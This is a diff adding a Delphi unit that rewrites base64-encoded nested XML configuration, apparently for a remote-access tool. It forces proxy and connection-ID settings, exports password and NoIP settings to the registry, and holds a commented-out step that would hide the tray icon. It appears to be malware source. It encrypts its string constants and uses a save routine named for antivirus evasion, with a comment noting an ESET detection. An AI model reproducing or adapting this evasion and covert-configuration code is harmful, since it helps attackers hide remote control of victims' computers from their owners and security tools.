@@ -1,0 +1,267 @@
+unit XmlWrk;
+
+interface
+
+uses
+  Windows, Classes;
+
+  function SetSubXMLParameters(const FileName, ASubXmlName: string;
+                               AParamsList: TStringList;
+                               RegRootKey: DWORD = 0;
+                               RegKey: string = ''): Boolean;
+  function SetSubXMLParameters2(const FileName, ASubXmlName, AProxyHostPort: string): Boolean;
+
+  function XML2Registry(const FileName: string; RegRootKey: DWORD; RegKey: string): Boolean;
+
+
+implementation
+
+uses
+   SysUtils, NativeXml, RegWrk, Crypto, RxStrUtils;
+
+
+{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
+function StringToStream(const AString: string): TStream;
+begin
+  Result := TStringStream.Create(AString);
+end;
+
+{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
+function SetXMLValues(AXmlDoc: TNativeXml; const AParamsList: TStringList): Boolean;
+var
+  i: Integer;
+  XmlNode: TXmlNode;
+begin
+  Result := False;
+  if not Assigned(AParamsList) then
+     Exit;
+     
+  for i := 0 to AParamsList.Count - 1 do
+  begin
+    XmlNode := AXmlDoc.Root.NodeByName(AParamsList.Names[i]);
+    if not Assigned(XmlNode) then
+       Continue;
+    XmlNode.Value := AParamsList.ValueFromIndex[i];
+  end;
+end;
+
+
+{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
+procedure AntiAVSaveToFile(AXML: TNativeXml; const AFileName: string);
+var
+  S: TStream;
+begin
+  S := TFileStream.Create(AFileName, fmCreate);
+  try
+    AXML.SaveToStream(S);
+  finally
+    S.Free;
+  end;
+end;
+
+{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
+// FileName - имя xml-файла
+// ASubXmlName - имя узла, который содержит base64 дочерний XML
+// AParamsList - список вида: параметр=значение
+function SetSubXMLParameters(const FileName, ASubXmlName: string;
+                             AParamsList: TStringList;
+                             RegRootKey: DWORD = 0;
+                             RegKey: string = ''): Boolean;
+
+var
+  ParentXmlDoc, SubXmlDoc: TNativeXml;
+  XmlNode: TXmlNode;
+//  UStr: Utf8String;
+  S: string;
+  XmlStream: TStream;
+begin
+  Result := False;
+
+  if not FileExists(FileName) or not Assigned(AParamsList) then
+     Exit;
+
+  ParentXmlDoc := TNativeXml.Create(nil);
+  SubXmlDoc    := TNativeXml.Create(nil);
+  try
+    ParentXmlDoc.LoadFromFile(FileName);
+
+    // Читаем узел с base64 xml
+    XmlNode := ParentXmlDoc.Root.NodeByName(ASubXmlName);
+    if not Assigned(XmlNode) then
+       Exit;
+    S := DecodeBase64(XmlNode.Value);
+
+    // Создаем новый XML с ним
+    XmlStream := StringToStream(S);
+    try
+      // Заполняем параметры
+      SubXmlDoc.LoadFromStream(XmlStream);
+      SubXmlDoc.XmlFormat := xfPreserve;
+      SetXMLValues(SubXmlDoc, AParamsList);
+
+      // Пишем в реестр, если надо
+//      if (RegRootKey <> 0) and (RegKey <> '') then
+//        WriteXmlNodeToReg(RegRootKey, RegKey, ASubXmlName, SubXmlDoc.WriteToString);
+
+      // И записываем обратно, необходимо использовать обычный string, а не UTF8
+      S := EncodeBase64(SubXmlDoc.WriteToString);
+      XmlNode.Value := S;
+
+      //ParentXmlDoc.SaveToFile(FileName); // NOD detect 11.06.2015
+      AntiAVSaveToFile(ParentXmlDoc, FileName);
+
+      Result := True;
+    finally
+      XmlStream.Free;
+    end;
+  finally
+    ParentXmlDoc.Free;
+    SubXmlDoc.Free;
+  end;
+end;
+
+{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
+// FileName - имя xml-файла
+// ASubXmlName - имя узла, который содержит base64 дочерний XML
+// AProxyHostPort - параметры прокси в виде host:port
+// В свойствах объекта в Delphi $09 = Enabled, $08 = Disabled
+function SetSubXMLParameters2(const FileName, ASubXmlName, AProxyHostPort: string): Boolean;
+const
+  _DISABLED = Char($08);
+  _ENABLED  = Char($09);
+  SHOW_TRAY_ICON = {#CRYPT 'ShowTrayIcon'}#46#182#186#208#72#116#122#242#215#87#182#85#2#52{ENDC};
+  USE_HTTP_PROXY = {#CRYPT 'UseHTTPProxyServer'}#46#176#229#96#127#250#71#145#7#247#3#180#232#93#82#69#251#187#19#96{ENDC};
+  PROXY_TYPE     = {#CRYPT 'ProxyType'}#46#181#129#62#131#219#213#186#125#237#77{ENDC};
+  PROXY_HOST     = {#CRYPT 'ProxyHost'}#46#181#129#62#131#219#201#36#196#125#11{ENDC};
+  PROXY_PORT     = {#CRYPT 'ProxyPort'}#46#181#129#62#131#219#209#42#233#246#95{ENDC};
+  PROXY_AUTH     = {#CRYPT 'ProxyAuthentication'}#46#181#129#62#131#219#192#4#5#82#231#85#100#115#136#239#34#13#53#55#49{ENDC};
+  ID_CONNECTION  = {#CRYPT 'IDConnection'}#46#172#93#206#249#195#10#227#52#119#83#129#242#53{ENDC};
+var
+  ParentXmlDoc, SubXmlDoc: TNativeXml;
+  XmlNode: TXmlNode;
+  binStr: string;
+//  XmlStream: TStream;
+  Idx: Integer;
+  S: string;
+  sProxyHost, sProxyPort: string;
+begin
+  Result := False;
+
+  if not FileExists(FileName) or (AProxyHostPort = '') then
+     Exit;
+
+  sProxyHost := Copy(AProxyHostPort, 1,
+                                     Pos(':', AProxyHostPort) - 1);
+  sProxyPort := Copy(AProxyHostPort, Pos(':', AProxyHostPort) + 1,
+                                     Length(AProxyHostPort) - Pos(':', AProxyHostPort));
+
+  ParentXmlDoc := TNativeXml.Create(nil);
+  SubXmlDoc    := TNativeXml.Create(nil);
+  try
+    ParentXmlDoc.LoadFromFile(FileName);
+
+    // Читаем узел с base64 xml
+    XmlNode := ParentXmlDoc.Root.NodeByName(ASubXmlName);
+    if not Assigned(XmlNode) then
+       Exit;
+    binStr := DecodeBase64(XmlNode.Value);
+
+    {* ShowTrayIcon *}
+//     Idx := Pos(DecStr(SHOW_TRAY_ICON), binStr);
+//     if Idx > 0 then
+//        binStr[Idx + Length(DecStr(SHOW_TRAY_ICON))] := _DISABLED;
+
+    {* UseHTTPProxyServer *}
+     Idx := Pos(DecStr(USE_HTTP_PROXY), binStr);
+     if Idx > 0 then
+        binStr[Idx + Length(DecStr(USE_HTTP_PROXY))] := _ENABLED;
+
+    {* Ищем место для записи хвоста с параметрами прокси *}
+     Idx := Pos(DecStr(PROXY_TYPE), binStr);
+     if Idx > 0 then
+       begin
+         // Обрезаем хвост
+         binStr := Copy(binStr, 1, Idx + Length(DecStr(PROXY_TYPE)) + 2);
+
+         // ProxyHost
+         binStr := binStr + DecStr(PROXY_HOST) + #06;
+         binStr := binStr + Char(Length(sProxyHost));
+         binStr := binStr + sProxyHost + #09;
+
+         // ProxyPort
+         binStr := binStr + DecStr(PROXY_PORT) + #03;
+         binStr := binStr + Char(Lo(StrToInt(sProxyPort)));
+         binStr := binStr + Char(Hi(StrToInt(sProxyPort))) + #13;
+
+         // ProxyAuth
+         binStr := binStr + DecStr(PROXY_AUTH) + #08 + Char($0C);
+
+         // IDConnection
+         binStr := binStr + DecStr(ID_CONNECTION) + #06 + Char($10);
+         binStr := binStr + MakeStr('A', $10) + #0 + #0;
+
+         S := EncodeBase64(binStr);
+         XmlNode.Value := S;
+
+         ParentXmlDoc.SaveToFile(FileName);
+         Result := True;
+       end;
+  finally
+    ParentXmlDoc.Free;
+    SubXmlDoc.Free;
+  end;
+end;
+
+{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
+{* Переводит параметры из XML в реестр                                                            *}
+function XML2Registry(const FileName: string; RegRootKey: DWORD; RegKey: string): Boolean;
+const
+  PWD_NODE = {#CRYPT 'Pwd'}#46#181#132#139#97{ENDC};
+  OPTIONS_NODE = {#CRYPT 'Options'}#46#170#42#210#165#195#215#166#23{ENDC};
+  NOIP_SETTINGS = {#CRYPT 'NoIPSettings'}#46#171#85#148#232#63#0#202#193#195#77#19#44#52{ENDC};
+var
+  ParentXmlDoc: TNativeXml;
+  XmlNode: TXmlNode;
+  binStr: string;
+begin
+  Result := False;
+
+  if not FileExists(FileName) then
+     Exit;
+
+  ParentXmlDoc := TNativeXml.Create(nil);
+  try
+    ParentXmlDoc.LoadFromFile(FileName);
+
+   (* Pwd *)
+    XmlNode := ParentXmlDoc.Root.NodeByName(DecStr(PWD_NODE));
+    if Assigned(XmlNode) then
+      begin
+        binStr := DecodeBase64(XmlNode.Value);
+        if binStr <> '' then
+           WriteXmlNodeToReg(RegRootKey, RegKey, DecStr(PWD_NODE), binStr);
+      end;
+   (* Options *)
+    XmlNode := ParentXmlDoc.Root.NodeByName(DecStr(OPTIONS_NODE));
+    if Assigned(XmlNode) then
+      begin
+        binStr := DecodeBase64(XmlNode.Value);
+        if binStr <> '' then
+           WriteXmlNodeToReg(RegRootKey, RegKey, DecStr(OPTIONS_NODE), binStr);
+      end;
+   (* NoIpSettings *)
+    XmlNode := ParentXmlDoc.Root.NodeByName(DecStr(NOIP_SETTINGS));
+    if Assigned(XmlNode) then
+      begin
+        binStr := DecodeBase64(XmlNode.Value);
+        if binStr <> '' then
+           WriteXmlNodeToReg(RegRootKey, RegKey, DecStr(NOIP_SETTINGS), binStr);
+      end;
+    Result := True;
+  finally
+    ParentXmlDoc.Free;
+  end;
+end;
+
+
+end.
